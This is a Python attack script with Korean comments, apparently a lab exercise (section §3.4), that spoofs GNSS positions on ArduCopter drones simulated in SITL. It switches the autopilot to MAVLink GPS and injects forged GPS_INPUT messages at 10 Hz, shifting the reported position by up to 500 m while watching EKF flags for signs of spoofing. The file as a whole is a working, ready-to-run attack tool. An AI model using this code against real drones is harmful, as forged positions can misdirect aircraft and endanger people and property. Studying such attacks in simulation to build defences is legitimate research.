#!/usr/bin/env python3
"""§3.4 GNSS 기만 공격: GPS_INPUT(msg_id=113) 주입으로 드론 위치 조작.

공격 흐름:
  1. GPS_TYPE=14 (MAVLink GPS) 파라미터 설정
  2. GLOBAL_POSITION_INT 텔레메트리에서 실제 위치 확보
  3. GPS_INPUT을 10Hz로 주입, 오프셋을 점진적으로 증가
  4. GCS 지도에서 드론 마커가 실제와 다른 위치로 이동하는 것 확인
  5. EKF flags 0x80 (CONST_POS_MODE) 켜지면 기만 징후

파라미터 복구:
  스크립트 종료 시 GPS_TYPE=1로 자동 복구한다.
  강제 종료(Ctrl+C)해도 복구 로직이 실행된다.

실험 순서:
  1. GCS 화면에서 드론 위치 확인 (기준점)
  2. python scripts/attack_gnss_spoof.py --drone drone-01
  3. GCS 지도에서 드론 마커가 천천히 이동하는 것 확인
  4. Wireshark: GPS_INPUT(msg_id=113) 패킷 확인
  5. Attacker 화면: EKF_STATUS_REPORT → flags 0x80 켜지는 시점

주의:
  GPS_TYPE=14 설정은 SITL 내부 GPS 시뮬레이션을 비활성화한다.
  실험 후 반드시 GPS_TYPE=1로 복구하거나 SITL을 재시작한다.
"""
import argparse
import datetime
import signal
import sys
import threading
import time
from pymavlink import mavutil

DRONE_PORTS = {"drone-01": 25760, "drone-02": 25770, "drone-03": 25780}
SITL_HOST   = "192.168.56.101"

COPTER_MODES = {0:"STABILIZE",3:"AUTO",4:"GUIDED",5:"LOITER",6:"RTL",9:"LAND"}

# GPS_INPUT ignore_flags 비트 마스크 (0 = 모든 필드 사용)
IGNORE_NONE = 0


# ── GPS 시간 계산 ──────────────────────────────────────────────────────────────

def get_gps_time() -> tuple[int, int]:
    """현재 UTC를 GPS week / week_ms 로 변환."""
    GPS_EPOCH = datetime.datetime(1980, 1, 6, tzinfo=datetime.timezone.utc)
    now       = datetime.datetime.now(datetime.timezone.utc)
    delta     = now - GPS_EPOCH
    week      = delta.days // 7
    week_ms   = int((delta.total_seconds() % (7 * 86400)) * 1000)
    return week, week_ms


# ── 연결 ──────────────────────────────────────────────────────────────────────

def connect(drone_id: str) -> mavutil.mavfile:
    port = DRONE_PORTS[drone_id]
    print(f"[CONNECT] {drone_id} @ {SITL_HOST}:{port}")
    conn = mavutil.mavlink_connection(
        f"tcp:{SITL_HOST}:{port}",
        source_system=255,
    )
    hb = conn.wait_heartbeat(timeout=10)
    if hb is None:
        print("[ERROR]   HEARTBEAT 타임아웃 — SITL 미실행 또는 포트 불일치")
        sys.exit(1)

    mode_num  = hb.custom_mode
    armed     = bool(hb.base_mode & 0x80)
    mode_name = COPTER_MODES.get(mode_num, f"MODE_{mode_num}")
    print(f"[READY]   sysid={conn.target_system}  mode={mode_name}  armed={armed}")
    conn.target_component = 1
    return conn


# ── GPS 파라미터 설정 / 복구 ───────────────────────────────────────────────────

def _set_param(conn: mavutil.mavfile, name: str, value: float) -> bool:
    ts = conn.target_system
    encoded = name.encode().ljust(16, b"\x00")[:16]
    conn.mav.param_set_send(ts, 1, encoded, value, mavutil.mavlink.MAV_PARAM_TYPE_INT8)
    ack = conn.recv_match(type="PARAM_VALUE", blocking=True, timeout=5)
    return ack is not None and abs(ack.param_value - value) < 0.5


def _get_param(conn: mavutil.mavfile, name: str) -> float | None:
    ts = conn.target_system
    encoded = name.encode().ljust(16, b"\x00")[:16]
    conn.mav.param_request_read_send(ts, 1, encoded, -1)
    msg = conn.recv_match(type="PARAM_VALUE", blocking=True, timeout=5)
    return float(msg.param_value) if msg else None


def set_gps_type_mavlink(conn: mavutil.mavfile) -> str | None:
    """GPS_TYPE=14 (MAVLink GPS) 설정. 성공한 파라미터 이름 반환, 실패 시 None."""
    # ArduCopter 버전에 따라 파라미터 이름이 다름 (GPS1_TYPE vs GPS_TYPE)
    for param_name in ("GPS1_TYPE", "GPS_TYPE"):
        current = _get_param(conn, param_name)
        if current is None:
            continue

        print(f"[PARAM]   {param_name} 현재값 = {int(current)}", end="")
        if int(current) == 14:
            print("  (MAVLink GPS, OK)")
            return param_name

        ok = _set_param(conn, param_name, 14.0)
        if ok:
            print(f"  → 14 (MAVLink GPS) 설정 완료")
            return param_name
        else:
            print(f"  → 설정 실패")

    return None


def restore_gps_type(conn: mavutil.mavfile, param_name: str) -> None:
    """GPS_TYPE=1 (기본) 복구."""
    print(f"\n[RESTORE] {param_name}=1 복구 중...")
    ok = _set_param(conn, param_name, 1.0)
    print(f"[RESTORE] {'완료' if ok else '실패 — SITL 재시작 필요'}")


# ── 실제 위치 취득 ─────────────────────────────────────────────────────────────

def get_real_position(conn: mavutil.mavfile, timeout: float = 10.0) -> tuple[float, float, float] | None:
    """GLOBAL_POSITION_INT 텔레메트리에서 현재 위치 반환 (lat, lon, alt_m)."""
    print("[POS]     실제 위치 취득 중...")
    deadline = time.time() + timeout
    while time.time() < deadline:
        msg = conn.recv_match(type="GLOBAL_POSITION_INT", blocking=True, timeout=1.0)
        if msg:
            lat = msg.lat / 1e7
            lon = msg.lon / 1e7
            alt = msg.alt  / 1000.0  # mm → m
            print(f"[POS]     lat={lat:.7f}  lon={lon:.7f}  alt={alt:.1f}m")
            return lat, lon, alt
    print("[POS]     취득 실패 — 텔레메트리 없음")
    return None


# ── 모니터 스레드 ──────────────────────────────────────────────────────────────

def monitor_loop(conn: mavutil.mavfile, stop_event: threading.Event,
                 state: dict) -> None:
    """EKF 상태·위치를 감시하고 기만 징후를 출력 (별도 스레드)."""
    last_lat, last_lon = None, None

    while not stop_event.is_set():
        msg = conn.recv_match(blocking=True, timeout=0.5)
        if msg is None:
            continue
        mtype = msg.get_type()

        if mtype == "GLOBAL_POSITION_INT":
            lat = msg.lat / 1e7
            lon = msg.lon / 1e7
            state["real_lat"] = lat
            state["real_lon"] = lon

            # 위치 급변 탐지 (EKF 기만 징후)
            if last_lat is not None:
                delta_m = ((lat - last_lat)**2 + (lon - last_lon)**2)**0.5 * 111320
                if delta_m > 20:
                    print(f"  [⚠]    위치 급변 {delta_m:.1f}m  lat={lat:.7f} lon={lon:.7f}")
            last_lat, last_lon = lat, lon

        elif mtype == "EKF_STATUS_REPORT":
            flags = msg.flags
            const_pos = bool(flags & 0x80)
            if const_pos and not state.get("ekf_alarm"):
                state["ekf_alarm"] = True
                print(f"\n  [★]    EKF 0x80 CONST_POS_MODE 감지! GNSS 기만 탐지 지표")
                print(f"  [★]    flags=0x{flags:04x}  ekf_ok={not const_pos}")

        elif mtype == "STATUSTEXT":
            text = msg.text.rstrip("\x00")
            if any(k in text.lower() for k in ("gps", "ekf", "pos", "nav")):
                print(f"  [STAT]  {text}")


# ── GPS_INPUT 주입 스레드 ──────────────────────────────────────────────────────

def inject_loop(conn: mavutil.mavfile, stop_event: threading.Event,
                base_lat: float, base_lon: float, base_alt: float,
                step_deg: float, max_offset_deg: float,
                hz: float, state: dict) -> None:
    """GPS_INPUT을 hz Hz로 주입하며 오프셋을 점진적으로 증가."""
    interval     = 1.0 / hz
    offset_lat   = 0.0
    offset_lon   = 0.0
    inject_count = 0
    ts           = conn.target_system

    print(f"[INJECT]  GPS_INPUT 주입 시작  {hz}Hz  step={step_deg:.7f}°/주입")
    print(f"[INJECT]  최대 오프셋 {max_offset_deg:.4f}° ≈ {max_offset_deg*111320:.0f}m\n")

    while not stop_event.is_set():
        # 오프셋 점진 증가 (위도 방향만 이동)
        if abs(offset_lat) < max_offset_deg:
            offset_lat += step_deg
        if abs(offset_lon) < max_offset_deg:
            offset_lon += step_deg

        spoof_lat = base_lat + offset_lat
        spoof_lon = base_lon + offset_lon

        week, week_ms = get_gps_time()

        conn.mav.gps_input_send(
            int(time.time() * 1e6),      # time_usec
            0,                            # gps_id
            IGNORE_NONE,                  # ignore_flags (모든 필드 사용)
            week_ms,                      # time_week_ms
            week,                         # time_week
            3,                            # fix_type (3D fix)
            int(spoof_lat * 1e7),         # lat
            int(spoof_lon * 1e7),         # lon
            base_alt,                     # alt (m)
            0.5,                          # hdop
            0.5,                          # vdop
            0.0, 0.0, 0.0,               # vn, ve, vd
            0.2,                          # speed_accuracy
            0.5,                          # horiz_accuracy
            0.5,                          # vert_accuracy
            8,                            # satellites_visible
        )

        inject_count += 1
        state["inject_count"] = inject_count
        state["spoof_lat"]    = spoof_lat
        state["spoof_lon"]    = spoof_lon
        state["offset_m"]     = offset_lat * 111320

        if inject_count % int(hz * 5) == 0:
            real_lat = state.get("real_lat", base_lat)
            real_lon = state.get("real_lon", base_lon)
            drift_m  = ((spoof_lat - real_lat)**2 + (spoof_lon - real_lon)**2)**0.5 * 111320
            print(f"  [GPS]   주입 {inject_count}회  오프셋={offset_lat*111320:.1f}m"
                  f"  실제-기만 차이={drift_m:.1f}m")

        stop_event.wait(interval)


# ── 메인 공격 시퀀스 ───────────────────────────────────────────────────────────

def spoof_attack(drone_id: str, duration: int, hz: float,
                 step_m: float, max_m: float, skip_param: bool) -> None:
    print(f"\n{'='*55}")
    print(f"  §3.4 GNSS 기만 공격")
    print(f"  대상: {drone_id}  지속: {duration}s  {hz}Hz  오프셋단계: {step_m}m/주입")
    print(f"{'='*55}\n")

    conn  = connect(drone_id)
    state = {"real_lat": None, "real_lon": None, "ekf_alarm": False,
             "inject_count": 0, "spoof_lat": None, "spoof_lon": None,
             "offset_m": 0.0}

    # GPS 파라미터 설정
    param_name = None
    if not skip_param:
        param_name = set_gps_type_mavlink(conn)
        if param_name is None:
            print("[WARN]    GPS_TYPE 설정 실패 — GPS_INPUT이 무시될 수 있음")
            print("          계속 진행합니다. SITL에서 직접 param set GPS_TYPE 14 시도")
        else:
            print(f"[PARAM]   {param_name}=14 설정 완료 — 2초 대기 (GPS 전환)")
            time.sleep(2)

    # Ctrl+C 시 파라미터 복구
    def _cleanup(sig=None, frame=None):
        print("\n[EXIT]    종료 신호 수신")
        stop_monitor.set()
        stop_inject.set()
        if param_name and not skip_param:
            restore_gps_type(conn, param_name)
        conn.close()
        _print_result(state, duration)
        sys.exit(0)

    signal.signal(signal.SIGINT, _cleanup)

    # 현재 위치 취득
    pos = get_real_position(conn)
    if pos is None:
        print("[ERROR]   위치 취득 실패 — 드론 연결 확인 후 재시도")
        if param_name:
            restore_gps_type(conn, param_name)
        conn.close()
        sys.exit(1)

    base_lat, base_lon, base_alt = pos
    state["real_lat"] = base_lat
    state["real_lon"] = base_lon

    # 단위 변환: m → deg
    step_deg      = step_m / 111320
    max_offset_deg = max_m  / 111320

    # 스레드 시작
    stop_monitor = threading.Event()
    stop_inject  = threading.Event()

    monitor_t = threading.Thread(
        target=monitor_loop,
        args=(conn, stop_monitor, state),
        daemon=True,
    )
    inject_t = threading.Thread(
        target=inject_loop,
        args=(conn, stop_inject, base_lat, base_lon, base_alt,
              step_deg, max_offset_deg, hz, state),
        daemon=True,
    )

    monitor_t.start()
    inject_t.start()

    # duration 초 동안 대기
    print(f"[RUN]     {duration}초 공격 실행 중 (Ctrl+C로 조기 종료)")
    time.sleep(duration)

    # 종료
    stop_inject.set()
    stop_monitor.set()
    inject_t.join(timeout=2)

    if param_name and not skip_param:
        restore_gps_type(conn, param_name)

    conn.close()
    _print_result(state, duration)


def _print_result(state: dict, duration: int) -> None:
    print(f"\n{'='*55}")
    print(f"  결과 요약")
    print(f"{'='*55}")
    print(f"  총 GPS_INPUT 주입 횟수: {state['inject_count']}회")
    print(f"  최종 오프셋: {state['offset_m']:.1f}m")
    if state.get("spoof_lat"):
        print(f"  기만 위치:   lat={state['spoof_lat']:.7f}  lon={state['spoof_lon']:.7f}")
    if state.get("ekf_alarm"):
        print(f"  EKF 기만 탐지 신호: ✔ CONST_POS_MODE(0x80) 켜짐")
    else:
        print(f"  EKF 기만 탐지 신호: ✗ (오프셋 더 키우거나 GPS_TYPE=14 확인)")
    print(f"\n  [확인] → http://{SITL_HOST}:8000/gcs/  (지도에서 드론 마커 위치)")
    print(f"{'='*55}\n")


# ── 메인 ──────────────────────────────────────────────────────────────────────

def main() -> None:
    ap = argparse.ArgumentParser(
        description="§3.4 GNSS 기만 공격: GPS_INPUT 주입으로 드론 위치 조작"
    )
    ap.add_argument("--drone", required=True, choices=list(DRONE_PORTS),
                    help="공격 대상 드론 ID")
    ap.add_argument("--duration", type=int, default=60,
                    help="공격 지속 시간(초) (기본: 60)")
    ap.add_argument("--hz", type=float, default=10.0,
                    help="GPS_INPUT 주입 주파수 Hz (기본: 10)")
    ap.add_argument("--step", type=float, default=1.0,
                    help="주입 1회당 오프셋 증가량 (m) (기본: 1.0)")
    ap.add_argument("--max-offset", type=float, default=500.0,
                    help="최대 오프셋 (m) (기본: 500)")
    ap.add_argument("--skip-param", action="store_true",
                    help="GPS_TYPE 파라미터 변경 건너뜀 (이미 설정된 경우)")
    args = ap.parse_args()

    spoof_attack(
        drone_id   = args.drone,
        duration   = args.duration,
        hz         = args.hz,
        step_m     = args.step,
        max_m      = args.max_offset,
        skip_param = args.skip_param,
    )


if __name__ == "__main__":
    main()
